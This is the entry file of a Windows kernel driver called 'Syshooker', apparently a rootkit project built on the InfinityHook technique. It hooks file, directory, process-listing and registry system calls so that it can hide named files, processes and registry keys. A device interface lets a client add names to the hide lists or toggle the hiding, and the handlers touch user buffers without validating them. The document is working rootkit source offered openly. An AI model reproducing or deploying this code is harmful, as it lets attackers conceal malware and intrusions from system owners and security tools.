/*
*	Module Name:
*		entry.cpp
*
*	Abstract:
*		Sample driver that implements infinity hook to detour
*		system calls.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*
*	Special thanks to Nemanja (Nemi) Mulasmajic <nm@triplefault.io>
*	for his help with the POC.
*
*/

#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"
#include "ssdt.h"
#include "../Syshooker-Client/SyshookerCommon.h"
#include "Settings.h"
#include "utils.h"

// settings - empty linked lists by default
SyshookerSettings Settings = {
	nullptr, // FileMagicNamesHead
	nullptr, // ProcessMagicNamesHead
	nullptr  // RegistryMagicNamesHead
};

// Hooked Syscalls
#include "NtCreateFile.h"
//#include "NtWriteFile.h" // not using this one
#include "NtQueryDirectoryFile.h"
#include "NtQueryDirectoryFileEx.h"
#include "NtQuerySystemInformation.h"
#include "NtOpenKey.h"
#include "NtOpenKeyEx.h"
#include "NtQueryKey.h"
#include "NtEnumerateKey.h"

UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);

char CALLBACK_OVERWRITE_ENABLED = 0;

/*
*	The entry point of the driver. Initializes infinity hook and
*	sets up the driver's unload routine so that it can be gracefully 
*	turned off.
*/
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	//UNREFERENCED_PARAMETER(RegistryPath);

	// TODO - remove this hardcoded process hide name
	NameNode* ProcessHead = CreateNameNode(L"Test1.exe", 9);
	NameNode* FileHead = CreateNameNode(L"hideme.txt", 10);
	Settings.ProcessMagicNamesHead = ProcessHead;
	Settings.FileMagicNamesHead = FileHead;
	// add another file
	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
	Settings.FileMagicNamesHead->Next = FileHead;
	NameNode* RegistryHead = CreateNameNode(L"myKey", 5);
	Settings.RegistryMagicNamesHead = RegistryHead;

	// IRP Routines
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = SyshookerWrite;
	DriverObject->MajorFunction[IRP_MJ_READ] = SyshookerRead;

	// Device name
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Syshooker");

	// create Device Object
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}
	//kprintf("[+] syshooker DeviceObject address: %p\n", DeviceObject);
	//kprintf("[+] syshooker DriverUnload address: %p\n", DriverUnload);
	
	status = IoCreateSymbolicLink(&symLink, &deviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));

		// need to free DeviceObject to clean up!!!
		IoDeleteDevice(DeviceObject);
		return status;
	}

	//
	// Figure out when we built this last for debugging purposes.
	//
	kprintf("[+] syshooker: Loaded.\n");
	
	DriverObject->DriverUnload = DriverUnload;

	// HERE: find the address of a real syscall
	// Find the original address of NtCreateFile.
	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
	if (!OriginalNtCreateFile)
	{
		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtCreateFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtWriteFile
	/*OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
	if (!OriginalNtWriteFile)
	{
		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtWriteFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}*/

	// Find the original address of NtQueryDirectoryFile
	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
	if (!OriginalNtQueryDirectoryFile)
	{
		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFileEx
	OriginalNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFileEx);
	if (!OriginalNtQueryDirectoryFileEx)
	{
		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQuerySystemInformation
	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
	if (!OriginalNtQuerySystemInformation)
	{
		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// ---------------------------- The easy part ends here ------------------------------------------
	// 
	// for the syscalls that are not exported, we cannot use MmGetSystemRoutineAddress
	// we need to resolve their address from SSDT

	const void* SsdtAddress = GetSsdtAddress();
	if (!SsdtAddress) {
		kprintf("[-] syshooker: SSDT pattern not found.\n");
	}
	else {
		kprintf("[+] syshooker: SSDT address: %p\n", SsdtAddress);
	}

	// NtOpenKey
	OriginalNtOpenKey = (NtOpenKey_t)GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtOpenKey) {
		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtOpenKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] syshooker: NtOpenKey address: %p.\n", OriginalNtOpenKey);

	// NtQueryKey
	OriginalNtQueryKey = (NtQueryKey_t)GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtQueryKey) {
		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtQueryKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] syshooker: NtQueryKey address: %p.\n", OriginalNtQueryKey);

	// NtEnumerateKey
	OriginalNtEnumerateKey = (NtEnumerateKey_t)GetSyscallAddress(INDEX_NTENUMERATEKEY, (PCHAR)SsdtAddress);
	if (!OriginalNtEnumerateKey) {
		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtEnumerateKey);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] syshooker: NtEnumerateKey address: %p.\n", OriginalNtEnumerateKey);

	// NtOpenKeyEx
	OriginalNtOpenKeyEx = (NtOpenKeyEx_t)GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
	if (!OriginalNtOpenKeyEx) {
		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtOpenKeyEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}
	else kprintf("[+] syshooker: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);

	// Try to find addresses of the registry-related syscalls
	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
	// kprintf("[+] syshooker: NtOpenKey address: %p\n", NtOpenKeyAddr);

	/*const void* NtOpenKeyExAddr = GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
	kprintf("[+] syshooker: NtOpenKeyEx address: %p\n", NtOpenKeyExAddr);

	const void* NtQueryKeyAddr = GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
	kprintf("[+] syshooker: NtQueryKey address: %p\n", NtQueryKeyAddr);

	const void* NtQueryValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYVALUEKEY, (PCHAR)SsdtAddress);
	kprintf("[+] syshooker: NtQueryValueKey address: %p\n", NtQueryValueKeyAddr);

	const void* NtQueryMultipleValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYMULTIPLEVALUEKEY, (PCHAR)SsdtAddress);
	kprintf("[+] syshooker: NtQueryMultipleValueKey address: %p\n", NtQueryMultipleValueKeyAddr);*/

	//
	// Initialize infinity hook. Each system call will be redirected
	// to our syscall stub.
	//
	NTSTATUS Status = IfhInitialize(SyscallCallback);
	if (!NT_SUCCESS(Status))
	{
		kprintf("[-] syshooker: Failed to initialize with status: 0x%lx.\n", Status);
	}
	else
	{
		CALLBACK_OVERWRITE_ENABLED = 1;
	}
	
	return Status;
}

/*
*	Turns off infinity hook.
*/
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	CALLBACK_OVERWRITE_ENABLED = 0;

	// Unload infinity hook gracefully.
	IfhRelease();


	// Release driver resources (symlink, device object)
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	kprintf("[+] syshooker: Unloaded.\n");
}

// this function will be called for each syscall invoked from user-space
void __fastcall SyscallCallback(
	_In_ unsigned int SystemCallIndex, 
	_Inout_ void** SystemCallFunction)
{
	UNREFERENCED_PARAMETER(SystemCallIndex);

	if (!CALLBACK_OVERWRITE_ENABLED) return; // if overwrite is not enabled, do not check any addresses - just quit

	// overwrite the syscall address
	// if the SystemCallFunction on the stack equals any of the addresses that we hook,
	// overwrite the address with the corresponding detour function

	// NtCreateFile
	if (*SystemCallFunction == OriginalNtCreateFile)
	{	
		*SystemCallFunction = DetourNtCreateFile;
	}

	// NtWriteFile
	/*if (*SystemCallFunction == OriginalNtWriteFile)
	{
		*SystemCallFunction = DetourNtWriteFile;
	}*/

	// NtQueryDirectoryFile
	if (*SystemCallFunction == OriginalNtQueryDirectoryFile)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFile;
	}

	// NtQueryDirectoryFileEx
	if (*SystemCallFunction == OriginalNtQueryDirectoryFileEx)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFileEx;
	}

	// NtQuerySystemInformation
	if (*SystemCallFunction == OriginalNtQuerySystemInformation)
	{
		*SystemCallFunction = DetourNtQuerySystemInformation;
	}

	//NtOpenKey
	if (*SystemCallFunction == OriginalNtOpenKey)
	{
		*SystemCallFunction = DetourNtOpenKey;
	}

	//NtQueryKey
	if (*SystemCallFunction == OriginalNtQueryKey)
	{
		*SystemCallFunction = DetourNtQueryKey;
	}

	//NtEnumerateKey
	if (*SystemCallFunction == OriginalNtEnumerateKey)
	{
		*SystemCallFunction = DetourNtEnumerateKey;
	}

	//NtOpenKeyEx
	if (*SystemCallFunction == OriginalNtOpenKeyEx)
	{
		*SystemCallFunction = DetourNtOpenKeyEx;
	}
}

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
	ULONG_PTR information = 0; // used bytes to return back to client

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	do {
		if (irpSp->Parameters.Write.Length < sizeof(SyshookerApiWriteRequest)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		// make data buffer accessible as SyshookerApiWriteRequest structure pointer
		SyshookerApiWriteRequest* request = static_cast<SyshookerApiWriteRequest*>(Irp->UserBuffer);

		// check buffer for nullptr and NameLength
		if (request == nullptr || request->NameLength <= 0) {
			//kprintf("[-] syshooker IRQ_WRITE: Request buffer (%p) or length invalid.\n", request);

			status = STATUS_INVALID_PARAMETER;
			break;
		}

		// print the buffer in kernel
		//kprintf("[+] syshooker IRQ_WRITE: NameBuffer: %ws.\n", request->NameBuffer);

		if (request->Operation == OPERATION_ADD) {
			NameNode* NewNameNode = CreateNameNode(request->NameBuffer, request->NameLength);
			if (NewNameNode == nullptr) {
				kprintf("[-] syshooker: IRQ_WRITE: Failed to allocate newNameNode.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}

			//kprintf("[+] syshooker: IRQ_WRITE: newNameNode: %ws.\n", NewNameNode->NameBuffer);

			status = appendNameNode(request->Target, NewNameNode);
			if (!NT_SUCCESS(status)) {
				if (status == STATUS_DUPLICATE_NAME)
					kprintf("[+] syshooker: IRQ_WRITE: not adding duplicate.\n");
				else
					kprintf("[-] syshooker: IRQ_WRITE: Failed to append newNameNode.\n");

				FreeNameNode(NewNameNode);
				break;
			}
			else {
				kprintf("[+] syshooker: IRQ_WRITE: newNameNode appended successfully.\n");
			}
		}
		else if (request->Operation == OPERATION_REMOVE) {
			if (request->NameLength <= 0) {
				kprintf("[-] syshooker: IRQ_WRITE: remove operation, invalid NameLength (0).\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			status = removeNameNode(request->Target, request->NameBuffer);

		}
		else if (request->Operation == OPERATION_TOGGLE) {
			CALLBACK_OVERWRITE_ENABLED = CALLBACK_OVERWRITE_ENABLED == 1 ? 0 : 1;
			kprintf("[+] syshooker: IRQ_WRITE: Toggle. Overwrite Status is now: %d\n", CALLBACK_OVERWRITE_ENABLED);
		}
		else {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		

		// return data used
		information = sizeof(*request);
	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	size_t SettingsDumpSizeBytes = GetSettingsDumpSizeBytes();

	do {
		ULONG BufferSizeBytes = irpSp->Parameters.Read.Length;
		kprintf("[+] syshooker: %llu bytes required for settings dump.\n", SettingsDumpSizeBytes);

		if (BufferSizeBytes < SettingsDumpSizeBytes) {
			status = STATUS_BUFFER_TOO_SMALL;
			kprintf("[-] syshooker: Buffer too small (%lu). We need %llu bytes.\n", BufferSizeBytes, SettingsDumpSizeBytes);
			break;
		}

		// char buffer of the userspace data
		char* data = static_cast<char*>(Irp->UserBuffer);

		// check nullptr
		if (data == nullptr) {
			kprintf("[-] syshooker: IRQ_READ: Data cannot be nullptr.\n");

			status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		// first byte - current syshooker status
		*data = CALLBACK_OVERWRITE_ENABLED;
		
		// iterate over magicNames linked lists and populate the buffer with the names
		wchar_t* OutputBufferPtr = (wchar_t*)(data + 1);
		
		// files
		NameNode* CurrentNameNode = Settings.FileMagicNamesHead;

		// ensure that '\0' is added to the buffer even if the target chain is empty
		// in this case the while cycle won't even run once
		if (CurrentNameNode == nullptr) {
			*OutputBufferPtr = L'\0';
			OutputBufferPtr++;
		}
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;
			
			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break; // if the status is not success, don't continue
		

		// processes
		CurrentNameNode = Settings.ProcessMagicNamesHead;
		if (CurrentNameNode == nullptr) {
			*OutputBufferPtr = L'\0';
			OutputBufferPtr++;
		}
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;

			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break; // if the status is not success, don't continue 
		
		// registry
		CurrentNameNode = Settings.RegistryMagicNamesHead;
		if (CurrentNameNode == nullptr) {
			*OutputBufferPtr = L'\0';
			OutputBufferPtr++;
		}
		while (CurrentNameNode != nullptr) {
			if (CurrentNameNode->NameBuffer == nullptr) {
				kprintf("[-] syshooker: this should not have happened - NameBuffer is NULL.\n");
				status = STATUS_FAIL_CHECK;
				break;
			}
			size_t index = 0;
			while (CurrentNameNode->NameBuffer[index] != L'\0') { // we guarantee NULL-termination
				*OutputBufferPtr = CurrentNameNode->NameBuffer[index];
				OutputBufferPtr++;
				index++;
			}
			// add '\' or '\0' based on whether this is the last node or not
			*OutputBufferPtr = CurrentNameNode->Next != nullptr ? L'\\' : L'\0';
			OutputBufferPtr++;

			// move to the next NameNode
			CurrentNameNode = CurrentNameNode->Next;
		}
		if (!NT_SUCCESS(status)) break;

	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = SettingsDumpSizeBytes;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}